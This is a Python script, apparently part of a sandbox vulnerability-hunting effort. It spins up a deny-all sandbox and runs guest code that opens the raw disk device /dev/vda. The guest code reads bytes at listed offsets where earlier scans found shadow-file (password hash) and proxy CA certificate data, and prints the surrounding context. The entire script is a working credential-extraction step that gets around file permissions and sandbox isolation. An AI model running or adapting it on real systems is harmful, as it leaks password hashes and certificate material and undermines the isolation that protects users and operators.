# -*- coding: utf-8 -*-
"""Phase39: 提取 shadow(33)/proxy-ca(7) 命中上下文 + CA 懒注入验证"""
import sys, time
sys.stdout.reconfigure(encoding='utf-8', errors='replace')
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
from fw_driver import api, cmd, TEAM, fresh_sandbox_deny_all

GUEST = r'''
import os

fd = os.open('/dev/vda', os.O_RDONLY)

# 1) shadow hits from scan3 (14-22GB)
shadow_offs = [0x39bcbb713, 0x41fcb9c3e, 0x41fcb9eb5, 0x437a53bf5, 0x437a53d0b,
               0x437a541e5, 0x437a541f9, 0x437a554d7, 0x437a55564, 0x437afecdf,
               0x437b1db26, 0x527eb84d9, 0x527eb8572, 0x527eb8580, 0x527ebde95]
for off in shadow_offs:
    try:
        chunk = os.pread(fd, 768, off - 256)
        txt = chunk.replace(b'\x00', b' ')
        print('[shadow 0x%x] %r' % (off, txt[:600]), flush=True)
    except Exception as e:
        print('[shadow 0x%x] EXC %s' % (off, e), flush=True)

# 2) proxy-ca hits
for off in [0x41ff8b044, 0x41ff8c1b8, 0x437b69624, 0x437b696b3, 0x437b6977c,
            0x437b697f9, 0x4a3bb8cc0]:
    try:
        chunk = os.pread(fd, 1024, off - 512)
        txt = chunk.replace(b'\x00', b' ')
        print('[proxy-ca 0x%x] %r' % (off, txt[:900]), flush=True)
    except Exception as e:
        print('[proxy-ca 0x%x] EXC %s' % (off, e), flush=True)

os.close(fd)
print('done-extract', flush=True)
'''
code = "cat > /tmp/pg47.py <<'PYEOF'\n" + GUEST + "\nPYEOF\npython3 /tmp/pg47.py"

if __name__ == "__main__":
    sid = fresh_sandbox_deny_all("fwtest17")
    time.sleep(2)
    c, r = cmd(sid, "bash", ["-lc", code], timeout_ms=90000)
    print('cmd:', c, flush=True)
    print(r[:16000], flush=True)
